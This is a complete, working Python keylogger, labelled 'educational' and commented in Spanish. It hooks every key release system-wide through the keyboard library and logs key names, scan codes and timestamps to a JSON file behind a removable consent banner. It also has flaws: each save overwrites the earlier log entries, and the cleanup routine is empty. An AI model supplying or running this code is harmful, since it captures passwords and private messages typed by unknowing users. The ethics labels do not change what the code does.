import keyboard
import time
from datetime import datetime
import json
import os

class EducationalKeylogger:
    def __init__(self, log_file="keylog_educational.json"):
        self.log_file = log_file
        self.log_data = []
        self.start_time = datetime.now()
        
        # Información educativa
        self.metadata = {
            "project": "Keylogger Educativo",
            "purpose": "Investigación académica",
            "warning": "Solo usar con consentimiento explícito",
            "start_time": self.start_time.isoformat()
        }
    
    def callback(self, event):
        """Callback para capturar teclas éticamente"""
        timestamp = datetime.now().isoformat()
        
        log_entry = {
            "timestamp": timestamp,
            "key": event.name,
            "event_type": event.event_type,
            "scan_code": event.scan_code
        }
        
        self.log_data.append(log_entry)
        
        # Guardar cada 10 entradas para evitar pérdida de datos
        if len(self.log_data) >= 10:
            self.save_log()
    
    def save_log(self):
        """Guardar datos de forma estructurada"""
        if self.log_data:
            data_to_save = {
                "metadata": self.metadata,
                "key_logs": self.log_data.copy()
            }
            
            try:
                with open(self.log_file, 'w') as f:
                    json.dump(data_to_save, f, indent=2)
                print(f"[LOG] Datos guardados: {len(self.log_data)} entradas")
            except Exception as e:
                print(f"[ERROR] No se pudo guardar: {e}")
            
            self.log_data = []
    
    def display_consent_warning(self):
        """Mostrar advertencia de consentimiento"""
        print("=" * 60)
        print("KEYLOGGER EDUCATIVO - SOLO USO ÉTICO")
        print("=" * 60)
        print("ADVERTENCIA: Este software debe usarse solo:")
        print("- Con consentimiento explícito del usuario")
        print("- En sistemas propios")
        print("- Para fines educativos o de investigación")
        print("- Cumpliendo todas las leyes locales")
        print("=" * 60)
        input("Presiona Enter para continuar (confirma que tienes autorización)...")
    
    def start(self):
        """Iniciar keylogger educativo"""
        self.display_consent_warning()
        
        print("Iniciando captura educativa...")
        print("Presiona ESC + S para detener")
        
        keyboard.on_release(callback=self.callback)
        
        # Combinación ética para detener
        keyboard.add_hotkey('esc+s', self.stop)
        
        # Mantener el programa corriendo
        keyboard.wait()
    
    def stop(self):
        """Detener keylogger y guardar datos finales"""
        print("\nDeteniendo keylogger educativo...")
        self.save_log()
        
        end_time = datetime.now()
        duration = end_time - self.start_time
        
        print(f"Sesión educativa finalizada")
        print(f"Duración: {duration}")
        print(f"Datos guardados en: {self.log_file}")
        
        # Auto-destrucción opcional para proyectos académicos
        self.cleanup()
        
        os._exit(0)
    
    def cleanup(self):
        """Limpieza ética final"""
        print("Realizando limpieza final...")

# Función principal para uso educativo
def main():
    # Configuración para proyecto educativo
    keylogger = EducationalKeylogger("project_research.json")
    
    try:
        keylogger.start()
    except KeyboardInterrupt:
        print("\nInterrupción por usuario - Guardando datos...")
        keylogger.stop()
    except Exception as e:
        print(f"Error educativo: {e}")
        keylogger.stop()

if __name__ == "__main__":
    main()